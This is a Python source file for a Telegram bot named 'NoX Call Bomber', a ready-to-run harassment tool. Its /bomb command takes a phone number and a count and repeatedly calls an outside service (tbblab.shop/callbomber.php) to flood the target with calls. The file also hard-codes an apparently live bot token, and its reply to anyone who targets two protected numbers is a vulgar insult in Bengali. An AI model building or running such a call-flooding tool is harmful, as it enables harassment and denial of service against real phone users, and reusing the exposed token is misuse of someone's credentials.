from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import asyncio

BOT_TOKEN = "7617449364:AAHIiVao_pBG4w_tEL-lZQezSTsW3QEBOnU"

# ☠️ VIP Numbers (Untouchable)
BLOCKED_NUMBERS = {"01834912943", "01605757303"}

# 💀 Active bombing tasks
ACTIVE_BOMBS = {}

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡️ 𝖂𝖊𝖑𝖈𝖔𝖒𝖊 𝖙𝖔 𝙉𝙤𝙓 𝘾𝘼𝙇𝙇 𝘽𝙊𝙈𝘽𝙀𝙍 ⚡️\n\n"
        "🧨 Use:\n"
        "/bomb 01xxxxxxxxx 10\n"
        "/bomb_off 01xxxxxxxxx"
    )

# /bomb command
async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("🔻 𝙐𝙨𝙖𝙜𝙚: /bomb 01xxxxxxxxx 10")
        return

    number = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝘼𝙢𝙤𝙪𝙣𝙩! 𝙈𝙪𝙨𝙩 𝙗𝙚 𝙖 𝙣𝙪𝙢𝙗𝙚𝙧.")
        return

    # ☠️ Check VIP Numbers
    if number in BLOCKED_NUMBERS:
        await update.message.reply_text("☠️ তোর আব্বুর নাম্বার দিয়ে লাভ নাই, ওইটা তোর মায়ের কাছে আছে 🍆💦")
        return

    if number in ACTIVE_BOMBS:
        await update.message.reply_text("⚠️ 𝘽𝙤𝙢𝙗 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙖𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧 𝙩𝙝𝙞𝙨 𝙩𝙖𝙧𝙜𝙚𝙩!")
        return

    await update.message.reply_text(
        f"💣 𝙇𝙖𝙪𝙣𝙘𝙝𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣: `{number}`\n"
        f"⚔️ 𝙁𝙞𝙧𝙚 𝙋𝙤𝙬𝙚𝙧: `{amount}`\n"
        f"Abort anytime with /bomb_off {number}"
    )

    task = asyncio.create_task(perform_bombing(number, amount, context, update))
    ACTIVE_BOMBS[number] = task

# /bomb_off command
async def bomb_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("🛑 𝙐𝙨𝙚: /bomb_off 01xxxxxxxxx")
        return

    number = args[0]
    task = ACTIVE_BOMBS.get(number)
    if task:
        task.cancel()
        del ACTIVE_BOMBS[number]
        await update.message.reply_text(f"🚫 𝘼𝙩𝙩𝙖𝙘𝙠 𝙖𝙗𝙤𝙧𝙩𝙚𝙙 𝙛𝙤𝙧 `{number}`.")
    else:
        await update.message.reply_text("⚠️ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙗𝙤𝙢𝙗 𝙛𝙤𝙪𝙣𝙙.")

# Bombing task
async def perform_bombing(number, amount, context, update):
    sent = 0
    try:
        for _ in range(amount):
            if number not in ACTIVE_BOMBS:
                break
            try:
                url = f"https://tbblab.shop/callbomber.php?mobile={number}"
                requests.get(url, timeout=5)
                sent += 1
                await asyncio.sleep(1.2)
            except Exception as e:
                print(f"[Error] {e}")
                await asyncio.sleep(2)
    except asyncio.CancelledError:
        print(f"[CANCELLED] Bombing halted for {number}")
    finally:
        if number in ACTIVE_BOMBS:
            del ACTIVE_BOMBS[number]
        await update.message.reply_text(
            f"✅ 𝘽𝙤𝙢𝙗𝙞𝙣𝙜 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙.\n🎯 Total Hits: `{sent}` to `{number}`"
        )

# Run the bot
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("bomb_off", bomb_off))  # ✅ only underscore version

    print("💀 NoX Bomber Bot Online... Launching darkness.")
    app.run_polling()
